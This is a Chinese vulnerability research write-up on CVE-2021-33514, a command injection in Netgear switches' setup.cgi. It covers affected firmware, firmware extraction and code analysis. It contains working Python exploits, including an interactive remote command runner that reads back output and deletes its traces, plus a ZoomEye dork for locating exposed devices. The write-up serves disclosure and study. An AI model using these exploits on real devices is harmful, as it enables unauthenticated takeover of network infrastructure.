> 原文链接: https://www.anquanke.com//post/id/248135 


# CVE-2021-33514：Netgear 多款交换机命令注入漏洞


                                阅读量   
                                **25244**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t018ab774e5bd1f21c8.png)](https://p1.ssl.qhimg.com/t018ab774e5bd1f21c8.png)



作者：OneShell@知道创宇404实验室**<br>**

## 漏洞信息

CVE-2021-33514是发生在Netgear多款交换机上的命令注入漏洞，可以未认证远程代码执行，CVSS3：9.8（高危）。

漏洞产生的根本原因是libsal.so.0.0中的函数`sal_sys_ssoReturnToken_chk`存在命令注入，这个函数用于处理url中的`tocken`字段，直接将`tocken`传递到格式化字符串中，然后调用`popen`执行。后端处理setup.cgi加载了该so文件，并且在处理url的时候调用了该存在漏洞的函数。漏洞利用起来也非常简单，直接给cgi发送构造了命令的请求就可以。

Netgear官方给出的受漏洞影响设备和固件版本如下表：

|影响设备|固件版本
|------
|GC108P|&lt;=1.0.7.3
|GC108PP|&lt;=1.0.7.3
|GS108Tv3|&lt;=7.0.6.3
|GS110TPP|&lt;=7.0.6.3
|GS110TPv3|&lt;=7.0.6.3
|GS110TUP|&lt;=1.0.4.3
|GS710TUP|&lt;=1.0.4.3
|GS716TP|&lt;=1.0.2.3
|GS716TPP|&lt;=1.0.2.3
|GS724TPP|&lt;=2.0.4.3
|GS724TPv2|&lt;=2.0.4.3
|GS728TPPv2|&lt;=6.0.6.3
|GS728TPv2|&lt;=6.0.6.3
|GS752TPPv1|&lt;=6.0.6.3
|GS752TPv2|&lt;=6.0.6.3
|MS510TXM|&lt;=1.0.2.3
|MS510TXUP|&lt;=1.0.2.3



## 漏洞复现

复现过程仅仅使用了python的requests模块，设备使用的是放置在公网的GS110TPP，固件版本V7.0.1.16，使用的so和cgi程序关键代码差别不大，具有代表性。通过分析交换机固件发现里面常见的可以反弹shell的程序都木有，那验证命令执行就使用了curl，用它去访问我的公网VPS，如果nc检测到访问，说明发生了命令注入。

```
import requests
vul_url = 'https://X.X.X.X/cgi/setup.cgi?token=\';$(cat);\''
payload = 'curl X.X.X.X.X:8080'
try:
    res = requests.post(url=vul_url, data=payload, verify=False, timeout=10)
    print('[!] should not return any thing')
except:
    print('[+] success!')
```

[![](https://p1.ssl.qhimg.com/t0188cfd924f26b7a90.png)](https://p1.ssl.qhimg.com/t0188cfd924f26b7a90.png)



## 漏洞分析

### <a class="reference-link" name="%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96"></a>固件提取

首先在Netgear官网上可以下载到存在漏洞的固件，必须赞扬一下Netgear，基本上以往的固件都可以下载到，而且几乎都是没有加密的，这对漏洞分析来说大大的好。下载到固件了按照流程`binwalk -Me`一把梭，然后使用find就会发现，找不到存在漏洞的so文件也找不到存在调用so的cgi程序。仔细看解压出来可能的文件系统文件夹里面，其实还有modsqfs.img和sqfs.img两个文件，这还得binwalk继续梭了这两个文件，才能有得到存在漏洞的so和cgi。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b244fa4828c9d7e4.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0124589e14ad07ee47.png)

### <a class="reference-link" name="%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"></a>静态分析

流程上还是比较简单的。首先看一下`libsal.so`里面存在漏洞的函数`sal_sys_ssoReturnToken_chk`，下面是直接贴出来IDA反编译结果，可以看到直接将函数输入`a1`，格式化字符串到`v25`中，然后调用`popen`执行了`v25`。

[![](https://p0.ssl.qhimg.com/t01f9fb43ed0b79e098.png)](https://p0.ssl.qhimg.com/t01f9fb43ed0b79e098.png)

再看看`setup.cgi`中是如何调用这个函数的，这个地方注意，C语言的或逻辑是，如果前面的判定通过了，后续就不进行判定。第一个判定是检查`query_string`中是否含有`tocken`字符串，当我们构造了payload那么判定会失败，则继续执行后面使用逗号连接的C语句，调用漏洞函数。`strtok`函数用于使用特定字符分割字符串，详情使用可以参考函数说明，最终就把`tocken`字段的值赋值给`v9`。

[![](https://p5.ssl.qhimg.com/t019e6b114ffb858e7b.png)](https://p5.ssl.qhimg.com/t019e6b114ffb858e7b.png)

### <a class="reference-link" name="%E5%85%B3%E4%BA%8ECGI%E4%BB%A5%E5%8F%8A%E6%AD%A4%E5%A4%84payload%E7%9A%84%E5%86%99%E6%B3%95"></a>关于CGI以及此处payload的写法

**CGI如何处理用户请求**

之前分析的路由器后端的程序，大多是某某httpd+cgi的做法，当时对于cgi程序如何获取到url传递的参数就仅仅有一个感性的认识：通过环境变量来进行传参，如果是GET请求，那么看环境变量`QUERY_STRING`，如果是POST请求，可能先从`CONTENT_LENGTH`获取数据长度，然后从`STDIN`中读取指定长度的数据。但对于cgi程序是如何执行的，与httpd之间的关系是什么，还是有点迷糊。于是找了一些文章大概看了下。

CGI（Common Gateway Interface）实际上是一种约定，一种接口协议，可以使用c、python、lua、php来实现。WEB服务器会根据CGI的类型决定如何向CGI程序传递数据，一般都是通过标准输入/输出流和环境变量来与CGI程序进行数据传递。例如这个地方的WEB服务器使用的是lighthttpd，通过逆向可以找到有一个函数`http_cgi_headers`是用来传递给CGI程序的一些环境变量的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016f585a5f553a7517.gif)

如果是使用的POST方式，服务器设定`CONTENT_LENGTH`环境变量说明POST数据的有效数据字节数，然后CGI通过传递的这个环境变量，从标准输入`STDIN`中去读取数据。在POC里面，首先token字段值会被注入，然后`$(cat)`从从标准输入中去读取数据，而此时POST的数据也被传递到了标准输入中，那么就相当于直接执行了POST发出的数据。

**payload的另一种写法**

如上，是通过环境变量和标准输入传递参数给CGI的，最开始的payload是通过POST请求将数据通过标准输入传递给CGI，而且没有执行结果回显。那么接下来使用GET请求+环境变量+获取执行结果的方式重新来写一次payload。

首先确定将要执行的命令通过哪一个环境变量传入，这个地方选择了`User-Agent`环境变量，也是经常被使用到的一种方式。其次是决定通过何种方式进行回显，此处是将执行结果写入到`/webtmp/`文件夹的一个js文件中。由于`/webtmp/`文件夹和`/tmp/`是链接起来（固件文件系统中查看）的，因此写入到`/webtmp/`文件夹，然后使用URL访问`/tmp/`中的js文件即可。

```
from requests.api import head
import requests
import random
import string
requests.packages.urllib3.disable_warnings()

proxy = `{`
`}`

letters = string.ascii_letters
vul_addr = 'https://X.X.X.X'
vul_url = vul_addr + '/cgi/setup.cgi?token=\';$HTTP_USER_AGENT;\''
random_str = ''.join(random.choice(letters) for i in range(10))

cmd1 = input('InputCMD: ').replace(' ', '$`{`IFS`}`')
cmd2 = f'rm /tmp/`{`random_str`}`.js'.replace(' ', '$`{`IFS`}`')

payload1 = f'sh -c `{`cmd1`}`&gt;/webtmp/`{`random_str`}`.js'
payload2 = f'sh -c `{`cmd2`}`'

header = `{``}`

try:
    header['User-Agent'] = payload1    # 注入命令并将结果写入到js文件
    res = requests.get(vul_url, headers=header, verify=False,
                       timeout=5, allow_redirects=False, proxies=proxy)
    if res.status_code == 200:
        print('[+] command send success')
        result_file = vul_addr + f'/tmp/`{`random_str`}`.js'
        result = requests.get(result_file, timeout=5,
                              verify=False, allow_redirects=False, proxies=proxy) # 读取结果js文件
        print('[+] get result')
        print(result.text)
        print('[+] rm tmp result file')
        header['User-Agent'] = payload2
        res = requests.get(vul_url, headers=header, verify=False,
                           timeout=5, allow_redirects=False, proxies=proxy)    # 删除结果js文件
except Exception as e:
    print(e)
```

[![](https://p5.ssl.qhimg.com/t01cac19e4ecdc4f847.png)](https://p5.ssl.qhimg.com/t01cac19e4ecdc4f847.png)



## 小结

这次的命令注入漏洞逻辑是比较简单的，注入点不需要很长的变量依赖分析。通过对于Netgear几次命令注入漏洞的分析，心中大概也清楚嵌入式设备中路由器大概是怎么获取用户请求数据，然后如何传递给CGI程序进行处理的。



## 使用zoomeye和pocsuite3

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E9%9D%A2"></a>漏洞影响面

通过ZoomEye网络空间搜索引擎，搜索ZoomEye dork数据挖掘语法查看漏洞公网资产影响面。

[zoomeye dork](https://www.zoomeye.org/searchResult?q=%3Faj4%2BfileVer) 关键词：”?aj4+fileVer”

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c18f8b54dfe8a9be.png)

[漏洞影响面全球视角可视化](https://www.zoomeye.org/globalmap/%3Faj4%2BfileVer/all/0)

[![](https://p5.ssl.qhimg.com/t01952da4d6fc4ff51b.png)](https://p5.ssl.qhimg.com/t01952da4d6fc4ff51b.png)

### <a class="reference-link" name="verify%E6%A8%A1%E5%BC%8F"></a>verify模式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cbe3ecb70a9fd7b7.png)

[![](https://p0.ssl.qhimg.com/t01e7cb062582ebc27a.png)](https://p0.ssl.qhimg.com/t01e7cb062582ebc27a.png)

### <a class="reference-link" name="attack%E6%A8%A1%E5%BC%8F"></a>attack模式

[![](https://p1.ssl.qhimg.com/t018c5b2443d8961faf.png)](https://p1.ssl.qhimg.com/t018c5b2443d8961faf.png)

[![](https://p1.ssl.qhimg.com/t01d17827c0d9a4a932.png)](https://p1.ssl.qhimg.com/t01d17827c0d9a4a932.png)



## 参考文献
<li>
[https://www.cnblogs.com/liuzhang/p/3929198.html](https://www.cnblogs.com/liuzhang/p/3929198.html)[/https://www.cnblogs.com/liuzhang/p/3929198.html](//www.cnblogs.com/liuzhang/p/3929198.html)
</li>